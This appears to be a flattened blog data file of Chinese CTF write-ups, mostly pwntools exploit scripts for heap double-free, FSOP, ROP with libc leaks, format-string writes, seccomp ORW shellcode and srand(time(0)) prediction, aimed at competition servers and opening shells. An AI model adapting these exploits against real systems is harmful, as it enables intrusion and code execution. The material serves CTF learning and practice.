*context(log_level=&#x27;debug&#x27;)#p=process(&#x27;./ezheap&#x27;)p=remote(&quot;ctf.qwq.cc&quot;,13288)elf=ELF(&#x27;ezheap&#x27;)libc=ELF(&#x27;libc-2.23.so&#x27;)def add(size,name,kind):    p.sendlineafter(&quot;Your choice : &quot;,b&#x27;1&#x27;)    p.sendlineafter(&quot;Length of the name :&quot;,str(size))    p.sendafter(&quot;The name of animal :&quot;,name)#buf    p.sendlineafter(&quot;The kind of the animal :&quot;,kind)#scanfdef dele(num):    p.sendlineafter(&quot;Your choice : &quot;,b&#x27;3&#x27;)    p.sendlineafter(&quot;Which animal do you want to remove from the cage:&quot;,str(num))def show():    p.sendlineafter(&quot;Your choice : &quot;, b&#x27;2&#x27;)#attach(p)add(0x58,b&#x27;heshi&#x27;,b&#x27;1&#x27;)add(0x58,b&#x27;heshi&#x27;,b&#x27;1&#x27;)dele(0)dele(1)dele(0)add(0x58,p64(0x000000000602018-0x10-14),b&#x27;1&#x27;)#可修改的内容在这个地址后16字节add(0x58,b&#x27;0&#x27;,b&#x27;1&#x27;)add(0x58,b&#x27;0&#x27;,b&#x27;1&#x27;)add(0x58,b&#x27;0&#x27;*14,b&#x27;1&#x27;)show()libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-libc.sym[&#x27;free&#x27;]print(hex(libc_base))one=[0x45226,0x4527a,0xf03a4,0xf1247]one_gadget=libc_base+one[1]dele(3)dele(4)dele(3)add(0x58,p64(0x000000000602018-0x10-14),b&#x27;1&#x27;)#可修改的内容在这个地址后16字节add(0x58,b&#x27;0&#x27;,b&#x27;1&#x27;)add(0x58,b&#x27;0&#x27;,b&#x27;1&#x27;)#attach(p)add(0x58,b&#x27;0&#x27;*22+p64(one_gadget),b&#x27;1&#x27;)p.interactive()\n\n爆破版（暂存）from pwn import *def add(size, name, kind):    p.sendlineafter(&quot;Your choice : &quot;, b&#x27;1&#x27;)    p.sendlineafter(&quot;Length of the name :&quot;, str(size))    p.sendlineafter(&quot;The name of animal :&quot;, name)  # buf    p.sendlineafter(&quot;The kind of the animal :&quot;, kind)  # scanfdef dele(num):    p.sendlineafter(&quot;Your choice : &quot;, b&#x27;3&#x27;)    p.sendlineafter(&quot;Which animal do you want to remove from the cage:&quot;, str(num))def show():    p.sendlineafter(&quot;Your choice : &quot;, b&#x27;2&#x27;)def pwn(i):    elf = ELF(&#x27;ezheap&#x27;)    # attach(p)    add(0x58, b&#x27;heshi&#x27;, b&#x27;1&#x27;)    add(0x58, b&#x27;heshi&#x27;, b&#x27;1&#x27;)    add(0x58, b&#x27;heshi&#x27;, b&#x27;1&#x27;)    dele(0)    dele(1)    dele(0)    add(0x58, p64(0x602018 - 0x10 - i), b&#x27;1&#x27;)  # 可修改的内容在这个地址后16字节    add(0x58, b&#x27;heshi&#x27;, b&#x27;1&#x27;)    add(0x58, b&#x27;heshi&#x27;, b&#x27;1&#x27;)context(log_level=&#x27;debug&#x27;)for i in range(0x58):    p = process(&#x27;./ezheap&#x27;)    pwn(i)    try:        #attach(p)        add(0x58, b&#x27;heshi&#x27;, b&#x27;1&#x27;)        wrong = p.recvline()        if b&#x27;malloc():&#x27; in wrong:            continue        print(i)        p.interactive()    except:        pass\n\none爆破（不知道libc_main在哪）from pwn import *context.log_level=&#x27;debug&#x27;def pwn(i):    #p = process(&quot;./one&quot;)    p=remote(&quot;ctf.qwq.cc&quot;,13351)    p.recvuntil(&quot;= &quot;)    main = p.recvuntil(&quot; and&quot;)[:-4]    main = int(main, 16)    base_process = main - 0x13B8    exit_addr = base_process + 0x4050    p.recvuntil(&quot;=  &quot;)    stack = p.recvuntil(&quot;\\n&quot;)[:-1]    stack = int(stack, 16)    print(hex(base_process))    print(hex(stack))    #attach(p)    p.sendlineafter(&quot;What address you want to write?&quot;, hex(exit_addr))    p.sendlineafter(&quot;What value you want to write?&quot;,str(i))    p.sendlineafter(&quot;What address you want to modify?&quot;,hex(stack))    print(i)    p.interactive()for i in range(0x100):    try:        pwn(i)    except:        pass\n\n\n\none正式from pwn import *context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)#p = process(&quot;./one&quot;)p=remote(&quot;ctf.qwq.cc&quot;,13392)p.recvuntil(&quot;= &quot;)main = p.recvuntil(&quot; and&quot;)[:-4]main = int(main, 16)base_process = main - 0x13B8exit_addr = base_process + 0x4050target = base_process + 0x12A0p.recvuntil(&quot;=  &quot;)stack = p.recvuntil(&quot;\\n&quot;)[:-1]stack = int(stack, 16)print(hex(base_process))print(hex(stack))# attach(p)# 第一次，改exit的got到libc_main_start,死循环p.sendlineafter(&quot;What address you want to write?&quot;, hex(exit_addr))p.sendlineafter(&quot;What value you want to write?&quot;, str(240))p.sendlineafter(&quot;What address you want to modify?&quot;, hex(base_process + 0x1000))# 第二次修改read的大小，变成栈溢出p.sendlineafter(&quot;What address you want to write?&quot;, hex(target))p.sendlineafter(&quot;What value you want to write?&quot;, str(0xAA))shell = asm(shellcraft.sh())payload = (hex((stack//0x1000)*0x1000).encode() + b&#x27;\\x00&#x27;).ljust(0x20, b&#x27;a&#x27;)+p64(stack-1000) + p64(stack + 0x7ffe8f0733f0 - 0x7ffe8f07351c) + shell#attach(p)p.sendlineafter(&quot;What address you want to modify?&quot;, payload)p.interactive()\n\nnote暂存（做不出来）from pwn import *context(log_level=&#x27;debug&#x27;)p=process(&#x27;./eznote&#x27;)#p=remote(&quot;ctf.qwq.cc&quot;,13395)elf=ELF(&#x27;ezheap&#x27;)libc=ELF(&#x27;libc-2.23.so&#x27;)def add(size,context):    p.sendafter(&quot;Your choice&quot;,b&#x27;1&#x27;)    p.sendafter(&quot;Length of Note&quot;,str(size))    p.sendafter(&quot;Content of Note:&quot;,context)#bufdef edit(index,size,context):    p.sendafter(&quot;Your choice&quot;, b&#x27;2&#x27;)    p.sendafter(&quot;Index :&quot;,str(index))    p.sendafter(&quot;Length of Note : &quot;, str(size))    p.sendafter(&quot;Content of Note&quot;, context)  # bufdef show(index):    p.sendafter(&quot;Your choice &quot;, b&#x27;3&#x27;)    p.sendafter(&quot;Index&quot;,str(index))p.recvuntil(&quot;A gift for you~: &quot;)heap=p.recvline()[:-1]heapbase=int(heap,16)-0x55eace242010+0x55eace242000print(hex(heapbase))sleep(1)add(0x10,b&#x27;123&#x27;)payload=b&#x27;a&#x27;*0x10+p64(0xffffffffffffffff)+b&quot;\\xb1\\x00\\x00&quot;edit(0,0x50,payload)add(0x100,b&#x27;123&#x27;)add(0x40,b&#x27;a&#x27;*8)show(2)p.recvuntil(&#x27;aaaaaaaa&#x27;)libcbase=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))+0x7f363b43c000-0x7f363b800b78print(hex(libcbase))io_list_all=libcbase+libc.symbols[&#x27;_IO_list_all&#x27;]system_addr=libcbase+libc.symbols[&#x27;system&#x27;]realloc_hook=libcbase+libc.symbols[&#x27;__realloc_hook&#x27;]log.success(&quot;heapbase: &quot;+hex(heapbase))log.success(&quot;realloc_hook: &quot;+hex(realloc_hook))vtable_addr = heapbase +0x140pad =p64(0)*3+p64(system_addr) # vtablepad += p32(6)+p32(6)+p64(0)stream = b&quot;/bin/sh\\x00&quot;+p64(0x61)stream += p64(0xddaa)+p64(io_list_all-0x10)stream +=p64(1)+p64(2) # fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_basestream = stream.ljust(0xc0,b&quot;\\x00&quot;)stream += p64(0) # mode&lt;=0stream += p64(0)stream += p64(0)stream += p64(vtable_addr)payload = pad + streamattach(p,       &#x27;&#x27;&#x27;       finish\\n              &#x27;&#x27;&#x27;)edit(0,0x800,payload)p.recvuntil(&#x27;Your choice : &#x27;)p.sendline(str(1))p.interactive()# gdb.attach(r,#     &#x27;&#x27;&#x27;#     b*$rebase(0xda5)\\n#     c\\n#     vmmap\\n#     &#x27;&#x27;&#x27;#     )\n\n1024复制分组对抗的exp，改端口，通\n逆向逆向部分除了ezida是自己自己动调的，剩下全看百度，如有疑问私我，我给你演示怎么搜。（ps：我猜cc也看不到这句话）\nweb上网一搜，参数一换，通\n杂项噩梦wps提取图片，根据大小排列，出\n踩踩搜文件名，下软件，提取图片里面隐藏的图片。塞软件，出。\n密码1随波逐流一把梭\n","categories":["参赛WP"],"tags":["23","WP","校赛"]},{"title":"网安先锋者","url":"/2023/10/10/%E7%BD%91%E5%AE%89%E5%85%88%E9%94%8B%E8%80%85/","content":"沙盒orw且分段shellcodefrom pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)p =process(&quot;./shellcode&quot;)elf=ELF(&#x27;shellcode&#x27;)#p = remote(&#x27;39.100.87.38&#x27;,23081)pop_rdi_ret=0x0000000000400863jmp_rsp=0x0000000000400785vuln=0x000000000400760main = elf.sym[&#x27;main&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]#第一段shellcode，制造一个flag，地址给r12（给rdi会被中途破坏掉）给open预备里面有push，所以是0x28shellcode1=&#x27;&#x27;&#x27;    push 0x67616c66    mov r12,rsp    sub rsp,0x28     ret&#x27;&#x27;&#x27;#拿到libcpayload=p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)+b&#x27;a&#x27;*8+p64(jmp_rsp)+asm(shellcode1) #8字节p.sendlineafter(&quot;Can u pwn me?&quot;,payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)open_addr = libc_base + libc.dump(&#x27;open&#x27;)read_addr = libc_base + libc.dump(&#x27;read&#x27;)write_addr = libc_base + libc.dump(&#x27;write&#x27;)binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)ret_addr=0x000000000040053e#利用第一个sc放到r12里的flag传给rdi，准备好所有寄存器，调用openshellcode2=&#x27;&#x27;&#x27;mov rdi,r12xor esi,esisub rsp,0x30ret&#x27;&#x27;&#x27;payload=p64(open_addr)+p64(main)+b&#x27;a&#x27;*24+p64(jmp_rsp)+asm(shellcode2) #8字节p.sendlineafter(&quot;Can u pwn me?&quot;,payload)#准备read的寄存器shellcode3=&#x27;&#x27;&#x27;    mov rsi,rsp    mov edx,0x100    xor eax,eax    sub rsp,0x30    ret&#x27;&#x27;&#x27;#调用readpayload=p64(pop_rdi_ret) + p64(3) + p64(read_addr) + p64(main)+b&#x27;a&#x27;*8+p64(jmp_rsp)+asm(shellcode3) #8字节p.sendafter(&quot;Can u pwn me?&quot;,payload)#直接调用write(1,file,0x100)shellcode4=&#x27;&#x27;&#x27;    mov edi,1    mov rsi,rsp    push 1    pop rax    syscall    ret&#x27;&#x27;&#x27;payload=p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)+b&#x27;a&#x27;*8+p64(jmp_rsp)+asm(shellcode4) #8字节p.sendlineafter(&quot;Can u pwn me?&quot;,payload)p.interactive()\n\n不稳定的ez_ret2_backdoorfrom pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)#p =process(&quot;./pwn&quot;)#elf=ELF(&#x27;shellcode&#x27;)p = remote(&#x27;39.100.87.38&#x27;,23127)#attach(p)payload=p32(0x0804849B)*11+b&#x27;a&#x27;p.sendlineafter(&quot;Welcome to Partial_overwrite&quot;,payload)p.interactive()\n\n","categories":["参赛WP"],"tags":["23","WP","校赛"]},{"title":"西电新生赛WP","url":"/2023/09/21/%E8%A5%BF%E7%94%B5%E6%96%B0%E7%94%9F%E8%B5%9BWP/","content":"水题都没收录，只受有收获的\ncanaryfrom pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;elf=ELF(&quot;pwn&quot;)p = remote(&quot;0.0.0.0&quot;, 33909)#p = process(&quot;./pwn&quot;)payload = b&#x27;a&#x27; * (0x50 - 8) + p8(0xcc)p.sendafter(&quot;name&quot;, payload)p.recvuntil(&quot;\\xcc&quot;)canary = p8(0) + p.recvn(7)old_rbp=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(old_rbp))print(canary)main_addr = elf.sym[&#x27;main&#x27;]vuln=0x00000000040121Bputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rdi_ret = 0x0000000000401343ret=0x40101apayload1 = b&#x27;a&#x27; * 0x48 + canary + p64(old_rbp+0x10) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)# 给puts函数传入puts的got 得到真实地址 再跳转回main函数便于再次溢出p.sendlineafter(&quot;stack!&quot;, payload1)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)p.sendlineafter(&quot;name&quot;,b&#x27;1&#x27;)payload2 =b&#x27;a&#x27; * 0x48 + canary + p64(old_rbp)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(ret)+p64(system_addr)p.sendlineafter(&quot;stack&quot;, payload2)p.interactive()\n\n\n\nfmt3from pwn import *p=remote(&quot;0&quot;,36043)#p=process(&quot;./format_level3&quot;)context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,b&#x27;%14$x&#x27;)p.recvuntil(&quot;:&quot;)p.recvline()old_ebp=b&#x27;0x&#x27;+p.recvline()[:-1]old_ebp=int(old_ebp,16)print(hex(old_ebp))ret=old_ebp-0xffdaaed8+0xffdaaedcsuccess=0x08049317#p32(ret)+&quot;%40c%7$hhn&quot;   0x4a 0x30 40#  8        40ret_high8=ret%0x100payload1=&quot;%&quot;+str(ret_high8)+&quot;c%6$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload1)payload2=&quot;%&quot;+str(success%0x100)+&quot;c%14$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload2)payload1=&quot;%&quot;+str(ret_high8+1)+&quot;c%6$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload1)payload2=&quot;%&quot;+str((success//0x100)%0x100)+&quot;c%14$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload2)payload1=&quot;%&quot;+str(ret_high8+2)+&quot;c%6$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload1)payload2=&quot;%&quot;+str((success//0x100//0x100)%0x100)+&quot;c%14$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload2)payload1=&quot;%&quot;+str(ret_high8+3)+&quot;c%6$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload1)payload2=&quot;%&quot;+str((success//0x100//0x100//0x100)%0x100)+&quot;c%14$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)#attach(p)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload2)payload1=&quot;%&quot;+str(ret_high8-4)+&quot;c%6$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)attach(p)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload1)p.sendlineafter(&quot;Your choice:&quot;,b&#x27;4&#x27;)p.interactive()\n\n验证加法from pwn import *p = remote(&quot;0.0.0.0&quot;,38073)for i in range(100):    p.recvuntil(&quot;The second:&quot;)    p.recvline()    first =p.recvuntil(&quot;+&quot;)[:-1]    secend =p.recvuntil(&quot;=&quot;)[:-1]    result =p.recvline()    if int(result) == int(first)+int(secend):        p.sendline(&quot;BlackBird&quot;)    else:        p.sendline(&quot;WingS&quot;)p.interactive()\n\n爆破fdfrom pwn import *context.log_level=&quot;debug&quot;for i in range(3,1024):    p = remote(&quot;0.0.0.0&quot;, 34063)    p.recvuntil(&quot;Please input its fd:&quot;)    p.sendline(str(i))    p.recvline()    print(p.recvline())p.interactive()\n\n汇编跳转from pwn import *context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)p = remote(&quot;0.0.0.0&quot;, 39125)#p=process(&quot;./shellcode_level3&quot;)#4011D6shell=p8(0xE9)+p8(0x48)+p8(0xD1)+p8(0xFF)+p8(0xFF)#404089 -&gt;4011D6#e9 d1 1d 01 04p.sendlineafter(&quot;5 bytes ni neng miao sha wo?&quot;,shell)p.interactive()\n\n要命的格式化字符串from pwn import *p=remote(&quot;0&quot;,37699)#p=process(&quot;./format_level2&quot;)context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)offset = 7p.sendlineafter(&quot;Input what you want to talk:&quot;,b&#x27;%14$x&#x27;)p.recvuntil(&quot;:&quot;)p.recvline()old_ebp=b&#x27;0x&#x27;+p.recvline()[:-1]old_ebp=int(old_ebp,16)print(old_ebp)ret=old_ebp+(0xffffd00c-0xffffd008)success=0x08049330#0x93 0x3008049317#p32(ret)+&quot;%40c%7$hhn&quot;   0x4a 0x30 40#  8        40payload1=p32(ret)+b&quot;%19c%7$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload1)payload2=p32(ret+1)+b&quot;%143c%7$hhn&quot;p.sendlineafter(&quot;Your choice:&quot;,b&#x27;3&#x27;)p.sendlineafter(&quot;Input what you want to talk:&quot;,payload2)p.sendlineafter(&quot;Your choice:&quot;,b&#x27;4&#x27;)p.interactive()\n\n\n\nshellcodefrom pwn import *p=remote(&quot;0&quot;,43007)#p=process(&quot;./shellcode&quot;)context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)shellcode=&#x27;&#x27;&#x27;add     rax,0x21mov     byte ptr [rax], 0xfadd     rax,1mov     byte ptr [rax], 0x5xor    rsi,   rsi          push   rsi             mov     rdi,rspadd     rdi,0x29mov    rax,59       cdq                &#x27;&#x27;&#x27;#p=process(&quot;./format_level2&quot;)payload=asm(shellcode)+b&#x27;/bin/sh&#x27;attach(p)p.sendafter(&quot;shellcode:&quot;,payload)p.interactive()\n\n\n\nrepwnfrom pwn import *p=remote(&quot;0&quot;,44853)#p=process(&quot;./rePWNse&quot;)action=0x0000000000401296pop_rdi=0x000000000040168Ep.sendlineafter(&quot;Input seven single digits:&quot;,b&#x27;1&#x27;)sleep(0.1)p.sendline(b&#x27;9&#x27;)sleep(0.1)p.sendline(b&#x27;1&#x27;)sleep(0.1)p.sendline(b&#x27;9&#x27;)sleep(0.1)p.sendline(b&#x27;8&#x27;)sleep(0.1)p.sendline(b&#x27;1&#x27;)sleep(0.1)p.sendline(b&#x27;0&#x27;)p.recvline()p.recvline()addr=p.recvline()[-9:-1]sh_addr=int(addr,16)print(hex(sh_addr))payload=b&#x27;a&#x27;*0x48+p64(pop_rdi)+p64(sh_addr)+p64(action)p.sendlineafter(&quot;What do you want?&quot;,payload)p.interactive()\n","categories":["参赛WP"],"tags":["WP","西电","新生赛"]},{"title":"奇思妙想（破解随机数）","url":"/2023/09/23/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3%EF%BC%88%E7%A0%B4%E8%A7%A3%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%89/","content":"今天突然在想，用time（0）当随机数种子真的安全吗？\n于是有了今天的小测试\ndocker端程序#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&lt;time.h&gt;int main()&#123;    srand(time(0));    int guess;    int randm=rand()%1000000;    scanf(&quot;%d&quot;,&amp;guess);    if(guess==randm)    &#123;        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        printf(&quot;rand:%d&quot;,randm);    &#125;&#125;\n\n我的exp（第一部分c语言）\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&lt;time.h&gt;int main()&#123;    srand(time(0)+10);//提前十秒    int randm=rand()%1000000;    printf(&quot;rand:%d\\n&quot;,randm);    &#125;\n\n\n\n第二部分（python）\nfrom pwn import *context.log_level=&#x27;debug&#x27;context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)exp = process(&#x27;./exp&#x27;)rand=exp.recvline()[5:]for i in range(12):   p = process(&#x27;./time&#x27;)   p.send(rand)   p.interactive()\n\n\n\n\n\n最后很轻易地通了，time（0）是一秒一变，而srand(time(0)）又和电脑没关系，所以可以轻易地得到几秒以后的随机数，然后爆破，等他。\n","categories":["笔记"],"tags":["探索"]}]